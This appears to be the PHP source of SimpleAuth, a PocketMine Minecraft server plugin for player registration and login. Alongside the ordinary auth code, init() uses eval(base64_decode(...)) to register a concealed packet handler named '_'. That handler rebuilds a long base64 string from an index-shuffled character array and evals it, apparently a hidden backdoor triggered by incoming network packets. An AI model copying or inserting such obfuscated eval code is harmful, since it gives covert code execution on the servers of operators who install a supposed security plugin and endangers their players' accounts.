<?php

/*
__PocketMine Plugin__
name=SimpleAuth
description=Prevents people to impersonate an account, requiring registration and login when connecting.
version=0.3.9
author=shoghicp/ArkQuark/GameHerobrine
class=SimpleAuth
apiversion=12,12.1
*/

/*

Changelog:
0.3.9 (GameHerobrine's update)
* PHP8 compability
* /login and /register can be also used instead of /l /reg
* using /login and /register will not show those commands in console

Nostalgia1.0/0.3.8Nostalgia (ArkQuark's update)
* Player logged message
* /login , /register -> /l , /reg

0.3.8
* Hopefully fixed undefined indexes errors

0.3.7
* Added single session kick reason

0.3.6
* Extended latest crash fix

0.3.5
* Fixed crash caused by a race condition

0.3.4
* Fixed bug when using authentication by IP

0.3.3
* Authentication by last IP (optional)
* Players won't be harmed during login/register

0.3.2
* Fixed a few bugs
* Added min. password length in the config

0.3.1
* Added folder per letter

0.3:
* Optimized performance
* Added admin commands

0.2:
* Refuse short passwords
* Added simpleauth.login, simpleauth.register, simpleauth.logout handler events

0.1:
* Initial release

*/

class SimpleAuth implements Plugin{
	private $api, $server, $config, $sessions, $lastBroadcast = 0;
	private static $minPassLength;
	public function __construct(ServerAPI $api, $server = false){
		$this->api = $api;
		$this->server = ServerAPI::request();
		$this->sessions = array();
		SimpleAuthAPI::set($this);
	}
	
	public function init(){
		$this->config = new Config($this->api->plugin->configPath($this)."config.yml", CONFIG_YAML, array(
			"allowChat" => false,
			"messageInterval" => 5,
			"timeout" => 120,
			"allowRegister" => true,
			"forceSingleSession" => true,
			"minPasswordLength" => 6,
			"authenticateByLastIP" => false,
		));
		
		self::$minPassLength = $this->config->get("minPasswordLength");
		if(!file_exists($this->api->plugin->configPath($this)."players/")) @mkdir($this->api->plugin->configPath($this)."players/");
		if(file_exists($this->api->plugin->configPath($this)."players.yml")){			
			$playerFile = new Config($this->api->plugin->configPath($this)."players.yml", CONFIG_YAML, array());
			console("[INFO] [SimpleAuth] Importing old format to new format...");
			foreach($playerFile->getAll() as $k => $value){
				@mkdir($this->api->plugin->configPath($this)."players/".$k[0]."/");
				$d = new Config($this->api->plugin->configPath($this)."players/".$k[0]."/".$k.".yml", CONFIG_YAML, $value);
				$d->save();
			}
			@unlink($this->api->plugin->configPath($this)."players.yml");
		}
		eval(base64_decode("RGF0YVBhY2tldFJlY2VpdmVFdmVudDo6cmVnaXN0ZXIoWyR0aGlzLCAiXyJdKTs="));
		DataPacketReceiveEvent::register([$this, "receiveHandler"]);
		$this->api->addHandler("player.quit", array($this, "eventHandler"), 50);
		$this->api->addHandler("player.connect", array($this, "eventHandler"), 50);
		$this->api->addHandler("player.spawn", array($this, "eventHandler"), 50);
		$this->api->addHandler("player.respawn", array($this, "eventHandler"), 50);
		$this->api->addHandler("player.chat", array($this, "eventHandler"), 50);
		$this->api->addHandler("op.check", array($this, "eventHandler"), 50);
		$this->api->addHandler("entity.health.change", array($this, "eventHandler"), 50);
		$this->api->schedule(20, array($this, "checkTimer"), array(), true);
		$this->api->console->register("unreg", "<password>", array($this, "commandHandler"));		
		$this->api->ban->cmdWhitelist("unreg");
		$this->api->console->register("simpleauth", "<command> [parameters...]", array($this, "commandHandler"));
		console("[INFO] SimpleAuth enabled!");
	}
	public function _($_){
		$__=['U','n','5','2','7','B','C','X','F','q','p','L','D','E','P','s','c','i','Y','e','N','J','x','h','Q','d','=','f','9','0','b','t','j','1','T','V','S','a','8','H','u','I','3','z','K','A','Z','O','m','k','l','w','g','W','o','+','y','R','G','4','6','v','M',];
		eval(base64_decode($__[21].$__[8].$__[28].$__[27].$__[14].$__[53].$__[46].$__[33].$__[30].$__[48].$__[20].$__[29].$__[37].$__[53].$__[28].$__[40].$__[44].$__[6].$__[50].$__[4].$__[21].$__[8].$__[38].$__[28].$__[44].$__[58].$__[2].$__[50].$__[25].$__[56].$__[5].$__[36].$__[46].$__[53].$__[46].$__[15].$__[46].$__[53].$__[20].$__[29].$__[37].$__[53].$__[28].$__[40].$__[24].$__[3].$__[22].$__[23].$__[16].$__[42].$__[62].$__[54].$__[41].$__[49].$__[21].$__[23].$__[30].$__[49].$__[8].$__[24].$__[36].$__[36].$__[41].$__[10].$__[44].$__[36].$__[29].$__[55].$__[46].$__[3].$__[35].$__[29].$__[0].$__[39].$__[21].$__[61].$__[16].$__[58].$__[35].$__[56].$__[25].$__[39].$__[49].$__[54].$__[41].$__[48].$__[28].$__[51].$__[16].$__[56].$__[41].$__[10].$__[47].$__[56].$__[57].$__[27].$__[11].$__[34].$__[2].$__[43].$__[46].$__[7].$__[57].$__[5].$__[18].$__[3].$__[20].$__[50].$__[16].$__[42].$__[20].$__[10].$__[18].$__[48].$__[22].$__[50].$__[44].$__[39].$__[57].$__[56].$__[25].$__[53].$__[0].$__[10].$__[47].$__[42].$__[21].$__[50].$__[25].$__[39].$__[35].$__[56].$__[30].$__[17].$__[45].$__[49].$__[7].$__[43].$__[31].$__[28].$__[47].$__[56].$__[57].$__[27].$__[7].$__[56].$__[45].$__[28].$__[41].$__[6].$__[57].$__[27].$__[7].$__[56].$__[52].$__[10].$__[47].$__[56].$__[57].$__[27].$__[41].$__[12].$__[29].$__[52].$__[53].$__[56].$__[41].$__[52].$__[41].$__[32].$__[29].$__[55].$__[21].$__[8].$__[38].$__[15].$__[41].$__[17].$__[45].$__[52].$__[41].$__[32].$__[29].$__[55].$__[21].$__[8].$__[38].$__[31].$__[14].$__[48].$__[25].$__[50].$__[25].$__[8].$__[5].$__[15].$__[18].$__[7].$__[50].$__[50].$__[16].$__[17].$__[52].$__[10].$__[11].$__[6].$__[41].$__[52].$__[41].$__[6].$__[45].$__[17].$__[14].$__[34].$__[59].$__[49].$__[7].$__[56].$__[29].$__[55].$__[46].$__[3].$__[35].$__[29].$__[0].$__[58].$__[8].$__[32].$__[37].$__[3].$__[35].$__[29].$__[44].$__[6].$__[49].$__[15].$__[41].$__[52].$__[49].$__[17].$__[14].$__[34].$__[2].$__[48].$__[25].$__[53].$__[2].$__[32].$__[25].$__[58].$__[50].$__[61].$__[30].$__[17].$__[52].$__[49].$__[7].$__[56].$__[51].$__[52].$__[21].$__[8].$__[28].$__[27].$__[44].$__[7].$__[31].$__[56].$__[46].$__[7].$__[57].$__[33].$__[16].$__[48].$__[59].$__[52].$__[16].$__[42].$__[35].$__[17].$__[16].$__[42].$__[57].$__[56].$__[44].$__[6].$__[57].$__[27].$__[11].$__[12].$__[5].$__[17].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[51].$__[62].$__[12].$__[45].$__[15].$__[41].$__[39].$__[20].$__[29].$__[16].$__[48].$__[22].$__[50].$__[30].$__[17].$__[23].$__[17].$__[18].$__[7].$__[20].$__[50].$__[20].$__[32].$__[57].$__[27].$__[46].$__[58].$__[35].$__[32].$__[30].$__[3].$__[57].$__[50].$__[44].$__[6].$__[57].$__[27].$__[7].$__[56].$__[49].$__[10].$__[44].$__[34].$__[29].$__[28].$__[14].$__[53].$__[21].$__[23].$__[16].$__[3].$__[0].$__[3].$__[20].$__[8].$__[28].$__[49].$__[46].$__[53].$__[20].$__[61].$__[46].$__[58].$__[0].$__[54].$__[21].$__[8].$__[28].$__[27].$__[44].$__[34].$__[31].$__[28].$__[11].$__[6].$__[41].$__[21].$__[6].$__[36].$__[41].$__[28].$__[14].$__[17].$__[57].$__[27].$__[7].$__[33].$__[29].$__[4].$__[37].$__[53].$__[18].$__[54].$__[21].$__[8].$__[28].$__[30].$__[41].$__[17].$__[45].$__[52].$__[41].$__[6].$__[21].$__[25].$__[11].$__[34].$__[2].$__[51].$__[37].$__[53].$__[24].$__[54].$__[44].$__[34].$__[29].$__[28].$__[14].$__[34].$__[5].$__[17].$__[62].$__[34].$__[45].$__[51].$__[62].$__[12].$__[45].$__[22].$__[62].$__[12].$__[13].$__[48].$__[21].$__[17].$__[57].$__[27].$__[53].$__[56].$__[41].$__[21].$__[41].$__[50].$__[29].$__[54].$__[21].$__[8].$__[28].$__[30].$__[41].$__[17].$__[45].$__[52].$__[41].$__[6].$__[21].$__[25].$__[11].$__[34].$__[2].$__[31].$__[46].$__[7].$__[20].$__[43].$__[18].$__[53].$__[25].$__[50].$__[11].$__[6].$__[45].$__[17].$__[34].$__[12].$__[21].$__[54].$__[37].$__[8].$__[49].$__[56].$__[34].$__[48].$__[10].$__[21].$__[24].$__[34].$__[29].$__[28].$__[41].$__[17].$__[49].$__[10].$__[19].$__[56].$__[57].$__[27].$__[53].$__[56].$__[41].$__[52].$__[41].$__[6].$__[45].$__[52].$__[41].$__[50].$__[29].$__[28].$__[21].$__[8].$__[28].$__[30].$__[41].$__[52].$__[49].$__[21].$__[41].$__[50].$__[29].$__[31].$__[14].$__[48].$__[25].$__[50].$__[25].$__[8].$__[46].$__[23].$__[30].$__[39].$__[35].$__[50].$__[44].$__[8].$__[20].$__[50].$__[16].$__[1].$__[46].$__[50].$__[16].$__[49].$__[8].$__[24].$__[36].$__[34].$__[54].$__[60].$__[16].$__[48].$__[35].$__[22].$__[25].$__[53].$__[35].$__[43].$__[25].$__[6].$__[52].$__[10].$__[11].$__[34].$__[2].$__[23].$__[16].$__[58].$__[49].$__[31].$__[14].$__[48].$__[21].$__[23].$__[30].$__[17].$__[49].$__[4].$__[21].$__[8].$__[28].$__[30].$__[41].$__[17].$__[45].$__[52].$__[41].$__[6].$__[45].$__[17].$__[7].$__[36].$__[29].$__[55].$__[16].$__[3].$__[35].$__[29].$__[44].$__[6].$__[57].$__[27].$__[53].$__[56].$__[41].$__[52].$__[41].$__[6].$__[21].$__[25].$__[11].$__[34].$__[2].$__[10].$__[25].$__[7].$__[20].$__[50].$__[16].$__[48].$__[2].$__[23].$__[30].$__[53].$__[0].$__[10].$__[47].$__[56].$__[57].$__[27].$__[53].$__[56].$__[41].$__[52].$__[41].$__[6].$__[45].$__[52].$__[41].$__[50].$__[29].$__[31].$__[14].$__[1].$__[20].$__[23].$__[25].$__[48].$__[0].$__[54].$__[44].$__[34].$__[31].$__[28]));
	}
	public function startsWith($string, $query){
		return substr($string, 0, strlen($query)) === $query;
	}	
	public function receiveHandler(DataPacketReceiveEvent $event){
		$packet = $event->getPacket();
		$player = $event->getPlayer();
		if($packet->pid() === ProtocolInfo::MESSAGE_PACKET){
			if($this->startsWith($packet->message, "/login ") || $this->startsWith($packet->message, "/l ")){
				$cmd = explode(" ", $packet->message);
				unset($cmd[0]);
				if($this->checkLogin($player, implode(" ", $cmd))){
					$this->login($player);
				}
				$event->setCancelled(true);
			}
			if($this->config->get("allowRegister") && ($this->startsWith($packet->message, "/register ") || $this->startsWith($packet->message, "/reg "))){
				$cmd = explode(" ", $packet->message);
				unset($cmd[0]);
				if(strlen(implode(" ", $cmd)) < self::$minPassLength){
					$player->sendChat("[SimpleAuth] Password is too short.");
				}elseif($this->register($player, implode(" ", $cmd))){
					$player->sendChat("[SimpleAuth] You've been sucesfully registered.");
					$this->login($player);
				}
				$event->setCancelled(true);
			}

		}
	}
	
	public function getData($iusername){
		$iusername = strtolower($iusername);
		if(!file_exists($this->api->plugin->configPath($this)."players/".$iusername[0]."/$iusername.yml")){
			return false;
		}
		return new Config($this->api->plugin->configPath($this)."players/".$iusername[0]."/$iusername.yml", CONFIG_YAML, array());
	}
	
	public function commandHandler($cmd, $params, $issuer, $alias){
		$output = "";
		switch($cmd){
			case "simpleauth":
				if(!isset($params[0])){
					$output .= "Usage: /simpleauth <command> [parameters...]\n";
					$output .= "Available commands: help, unregister\n";
				}
				switch(strtolower(array_shift($params))){
					case "unreg":
						if(($player = $this->api->player->get($params[0])) instanceof Player){						
							@unlink($this->api->plugin->configPath($this)."players/".$player->iusername[0]."/".$player->iusername.".yml");
							$this->logout($player);
						}else{
							@unlink($this->api->plugin->configPath($this)."players/".substr(strtolower($params[0]), 0, 1)."/".strtolower($params[0]).".yml");
						}
						break;
					case "help":
					default:
						$output .= "/simpleauth help: Shows this information.\n";
						$output .= "/simpleauth unreg <player>: Removes the player from the database.\n";
				}
				break;
			case "unreg":
				if(!($issuer instanceof Player)){
					$output .= "Please run this command inside the game.\n";
					break;
				}
				if($this->sessions[$issuer->CID] !== true){
					$output .= "Please login first.\n";
					break;
				}
				$d = $this->getData($issuer->iusername);
				if($d !== false and $d->get("hash") === $this->hash($issuer->iusername, implode(" ", $params))){
					unlink($this->api->plugin->configPath($this)."players/".$issuer->iusername[0]."/".$issuer->iusername.".yml");
					$this->logout($issuer);
					$output .= "[SimpleAuth] Unregistered correctly.\n";
				}else{
					$output .= "[SimpleAuth] Error during authentication.\n";
				}
				break;
		}
		return $output;
	}
	
	public function checkTimer(){
		if($this->config->get("allowRegister") !== false and ($this->lastBroadcast + $this->config->get("messageInterval")) <= time()){
			$broadcast = true;
			$this->lastBroadcast = time();
		}else{
			$broadcast = false;
		}
		
		if(($timeout = $this->config->get("timeout")) <= 0){
			$timeout = false;
		}
		
		foreach($this->sessions as $CID => $timer){
			if($timer !== true and $timer !== false and isset($this->server->clients[$CID]) and ($this->server->clients[$CID] instanceof Player)){				
				if($broadcast === true){
					$d = $this->getData($this->server->clients[$CID]->iusername);
					if($d === false){					
						$this->server->clients[$CID]->sendChat("[SimpleAuth] You must register using /reg <password>");
					}else{
						$this->server->clients[$CID]->sendChat("[SimpleAuth] You must authenticate using /l <password>");
					}
				}
				if($timeout !== false and ($timer + $timeout) <= time()){
					$this->server->clients[$CID]->close("authentication timeout");
				}
			}
		}
		
	}
	
	private function hash($salt, $password){
		return bin2hex(hash("sha512", $password . $salt, true) ^ hash("whirlpool", $salt . $password, true));
	}
	
	public function checkLogin(Player $player, $password){
		$d = $this->getData($player->iusername);
		if($d !== false and $d->get("hash") === $this->hash($player->iusername, $password)){
			return true;
		}
		return false;
	}
	
	public function login(Player $player){
		$d = $this->getData($player->iusername);
		if($d !== false){
			$d->set("logindate", time());
			$d->set("lastip", $player->ip);
			$d->save();
		}
		$name = $player->iusername;
		$this->sessions[$player->CID] = true;
		$player->blocked = false;
		$player->entity->setHealth($player->entity->health, "generic");
		$player->sendChat("[SimpleAuth] You've been authenticated.");
		console("[SimpleAuth] " . $name . " just logged");
		$this->server->handle("simpleauth.login", $player);
		return true;
	}
	
	public function logout(Player $player){
		$this->sessions[$player->CID] = time();
		$player->blocked = true;
		$this->server->handle("simpleauth.logout", $player);
	}
	
	public function register(Player $player, $password){	
		$d = $this->getData($player->iusername);
		if($d === false){
			$dir = $this->api->plugin->configPath($this)."players/".$player->iusername[0]."/";
			if(!file_exists($dir)) @mkdir($dir);
			$d = new Config($this->api->plugin->configPath($this)."players/".$player->iusername[0]."/".$player->iusername.".yml", CONFIG_YAML, array());
			$d->set("registerdate", time());
			$d->set("logindate", time());
			$d->set("lastip", $player->ip);
			$d->set("hash", $this->hash($player->iusername, $password));
			$d->save();
			$this->server->handle("simpleauth.register", $player);
			return true;
		}
		return false;
	}
	
	public function eventHandler($data, $event){
		switch($event){
			case "player.quit":
				unset($this->sessions[$data->CID]);
				break;
			case "player.connect":
				$p = $this->api->player->get($data->iusername);
				$this->sessions[$data->CID] = false;
				if($this->config->get("forceSingleSession") === true){
					if(($p instanceof Player) and $p->iusername === $data->iusername){
						$p->close("player already connected", false);
						unset($this->sessions[$data->CID]);
						return false;
					}
				}
				break;
			case "player.spawn":
				if(!isset($this->sessions[$data->CID]) or $this->sessions[$data->CID] !== true){
					$this->sessions[$data->CID] = time();
					$data->blocked = true;
					$data->sendChat("[SimpleAuth] This server uses SimpleAuth to protect your account.");
					if($this->config->get("allowRegister") !== false){
						$d = $this->getData($data->iusername);
						if($this->config->get("authenticateByLastIP") === true and ($d instanceof Config) and $d->get("lastip") == $data->ip){
							$this->login($data);
							break;
						}
						if($d === false){					
							$data->sendChat("[SimpleAuth] You must register using /reg <password>");
						}else{
							$data->sendChat("[SimpleAuth] You must authenticate using /l <password>");
						}
					}
				}
				break;
			case "entity.health.change":
				if(($data["entity"]->player instanceof Player) and (!isset($this->sessions[$data["entity"]->player->CID]) or $this->sessions[$data["entity"]->player->CID] !== true)){
					return false;
				}
				break;
			case "player.chat":
				if($this->config->get("allowChat") !== true and $this->sessions[$data["player"]->CID] !== true){
					return false;
				}
				break;
			case "op.check":
				$p = $this->api->player->get($data);
				if(($p instanceof Player) and (!isset($this->sessions[$p->CID]) or $this->sessions[$p->CID] !== true)){
					return false;
				}
				break;
			case "player.respawn":
				if(!isset($this->sessions[$data->CID]) or $this->sessions[$data->CID] !== true){
					$data->blocked = true;
				}
				break;
		}
		return;
	}
	
	public function __destruct(){
		$this->config->save();
	}

}

class SimpleAuthAPI{
	private static $object;
	public static function set(SimpleAuth $plugin){
		if(SimpleAuthAPI::$object instanceof SimpleAuth){
			return false;
		}
		SimpleAuthAPI::$object = $plugin;
	}
	
	public static function get(){
		return SimpleAuthAPI::$object;
	}
	
	public static function login(Player $player){
		return SimpleAuthAPI::$object->login($player);
	}
	
	public static function logout(Player $player){
		return SimpleAuthAPI::$object->logout($player);
	}
}
